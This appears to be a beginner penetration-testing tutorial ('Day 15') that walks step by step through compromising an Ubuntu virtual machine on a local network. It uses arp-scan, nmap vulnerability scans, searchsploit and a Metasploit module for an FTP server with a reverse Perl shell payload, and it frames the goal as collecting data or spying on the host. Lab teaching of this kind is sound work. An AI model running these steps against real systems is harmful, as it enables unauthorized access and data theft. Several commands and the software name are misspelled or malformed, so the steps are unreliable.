# ♦ Day 15
</br>
</br>

## ◙ ***Getting into an UBUNTU***
 </br>
 
# ♦ Getting into an UBUNTU : 
   ⇨ In this session we will be learning how to get into an ubuntu device and can collect data or spying onto the host pc, for this we will be using an Ubuntu Virtual device in our local nettwork(Virtual Machine). 
   </br>
   </br>
### ◙ Step-By-Step Guide 

### • 1. Reconnaissance : First of all we will be checking our local network if there arne any other devices connected or not (Note: for this to work in VM make sure both the devices are in same network settings preferrably "NAT Network" </br>
For scanning our local network we will be using ***arp scan*** by using following commands:

    sudo arp-scan -l -I eth1

After this we have to check which one of the device is tht we are looking for so for that we will use ***nmap*** to identify operating systems of all the devices individaually by using:

    sudo nmap -O >Ip add<

### • 2. Search For Vulnerability : Now we will be searching for the vulnerabilities of the ip we confirmed by doing nmap scans now for vulnerability searching we will be using the following command

    namp -Pn -sV --script vuln -oN vuln-ubuntu-nmap.txt >IP add<

As we can see from above report tht the version tht is being used is by the name "PRODTPD 1.3.3c".


### • 3. Now we would like to search for some exploits taht we can try, for that we will be using ***"Searchsploit"*** to search for exploits :

    searchexploit PRODTPD 1.3.3c

As we acan see there are 2 exploits for this version, and we will be using the one which can be done (Metasploit) cuz it most efficient and easy to do


### • 4. METASPLOIT : The Metasploit Project is a computer security project that provides information about security vulnerabilities and aids in penetration testing and IDS signature development. </br>

• Now to acess metasploit we have to type a command 

    msfconsole

• After getting into msfconsole we have to search for the exploits ***"PRODTPD 1.3.3c"***

     search PRODTPD 1.3.3c 

• Now select the 1st one with using command ***"use 0"***

    use 0

### • 5. Setting up Msfconsole : 

• Now we have to set up our msfconsole by seeing all the options that wre neede to be filled by watching them carefully ***"Show options"***

    show options

• As we can see there is no LHOST is in this payload instead it is asking for CHOST which we dont know so we will be changing the payload by using the given command
     
    show payloads
    set  cmd/unix/reverse_perl
    
now as we can see above we have to fill LPORT, LHOST, RHOSTS & RPORT by using :

    set RHOSTS >The Recivers Ip<
    set LHOST >The Linux Ip<
    set RPORT >The Reciving Port<
    set LPORT >The Listening Port<

⇨   After setting all tht we just simply have to Use ***"exploit"*** command

     exploit

• Now we have successfully gained the access of the UBUNTU Machine, now we can use ***"help"*** command to get all the details of what can we do in the system

